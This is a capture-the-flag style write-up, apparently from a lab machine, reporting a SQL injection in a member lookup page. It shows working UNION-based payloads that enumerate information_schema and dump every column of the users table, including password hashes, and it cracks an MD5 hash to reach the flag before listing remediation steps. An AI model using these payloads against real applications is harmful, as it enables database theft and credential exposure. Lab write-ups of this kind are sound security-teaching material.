# SQL injection (via member page) vulnerability report

### Location: ***http://192.168.56.3/index.php?page=member***

## Description:

On the user research page we tried to find a user by his ID. If we submit _1_, we get:

```
ID: 1 
First name: one
Surname : me
```

But when we test `SELECT * FROM users`, there is a SQL syntax error.

```
You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'SELECT * FROM users' at line 1
```

We can create a SQL statement that attempts to retrieve the version information from the database.

1 OR 1=1 UNION SELECT 1, (SELECT @@version)-- 

```
...
ID: 1 OR 1=1 UNION SELECT 1, (SELECT @@version)-- 
First name: Flag
Surname : GetThe

ID: 1 OR 1=1 UNION SELECT 1, (SELECT @@version)-- 
First name: 1
Surname : 5.5.64-MariaDB-1ubuntu0.14.04.1
```

Given that the syntax with special symbols didn't work we tried to execute simple SQL injection `1 OR 1=1` and we got this result:

```
ID: 1 OR 1=1 
First name: one
Surname : me

ID: 1 OR 1=1 
First name: two
Surname : me

ID: 1 OR 1=1 
First name: three
Surname : me

ID: 1 OR 1=1 
First name: Flag
Surname : GetThe
```

Now we know that we should find the `Flag` user and retrieve the name of the databases of the _users_ table. And we also know that the database is vulnerable to boolean-based SQL injection. Now let's test the commands without quotes, special symbols or punctuation.

`1 UNION SELECT table_name, column_name FROM information_schema.columns`

And we got this information for users table.

```
...
ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : user_id

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : first_name

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : last_name

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : town

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : country

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : planet

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : Commentaire

ID: 1 UNION SELECT table_name, column_name FROM information_schema.columns 
First name: users
Surname : countersign
```
Now we should got the _value_ of those columns without using normal syntax. 

We tried to use this command line:

`1 UNION SELECT user_id, first_name, last_name, town, country, planet, Commentaire, countersign FROM users`, 
but we got the same SQL syntax error.

Here it better _concatenate_ users columns to get the Flag:

`1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users`


```
ID: 1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: one
Surname : me

ID: 1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 1onemeParis FranceEARTHJe pense, donc je suis2b3366bcfd44f540e630d4dc2b9b06d9
Surname : 1

ID: 1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 2twomeHelsinkiFinlandeEarthAamu on iltaa viisaampi.60e9032c586fb422e2c16dee6286cf10
Surname : 1

ID: 1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 3threemeDublinIrlandeEarthDublin is a city of stories and secrets.e083b24a01c483437bcf4a9eea7c1b4d
Surname : 1

ID: 1 UNION SELECT CONCAT( user_id, first_name, last_name, town, country, planet, Commentaire,  countersign ) AS test, 1 FROM users 
First name: 5FlagGetThe424242Decrypt this password -> then lower all the char. Sh256 on it and it's good !5ff9d0165b4f92b14994e5c685cdce28
Surname : 1
```
When we decrypt 5ff9d0165b4f92b14994e5c685cdce28 from MD5 we get `FortyTwo`. Now we lower all capital char and encrypt it in SHA256.


## Recommendations:

1. Input _validation_ and _sanitization_ on all user inputs.

2. Use _prepared_ statements or _parameterized_ queries.

3. Grant users only the permissions they _absolutely_ need, avoid using _overly permissive_ database accounts.
